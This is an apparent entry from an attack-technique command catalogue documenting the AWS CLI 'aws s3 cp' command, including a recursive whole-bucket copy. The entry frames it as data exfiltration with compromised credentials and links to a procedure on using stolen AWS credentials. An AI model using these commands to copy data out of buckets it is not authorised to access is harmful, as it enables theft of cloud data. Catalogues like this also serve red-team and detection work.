---
id: cmd-uuid-002
data: 'aws s3 cp s3://bucket-name/object.txt .'
tags:
  - aws
  - cloud
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - AWS
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:29.053Z'
verified: false
validated: true
submitted: true
---
# aws-s3-cp

## Command

```bash
aws s3 cp s3://bucket-name/object.txt .
```

## Description

Copies objects from an S3 bucket to local storage, enabling data exfiltration using compromised AWS credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `s3://bucket-name/object.txt` | Source S3 path | Yes |
| `.` | Destination local path | Yes |
| `--recursive` | Copy entire bucket | No |

## Examples

### Basic Usage

```bash
aws s3 cp s3://mybucket/file.txt .
```

### Advanced Usage

```bash
aws s3 cp s3://mybucket/ . --recursive
```

## Expected Output

Progress indicator and confirmation, e.g.,

```
copy: s3://mybucket/file.txt to ./file.txt
```

## Related

- [[commands/aws-s3-ls]]
- [[procedures/Access-AWS-Resources-with-Stolen-Credentials]]
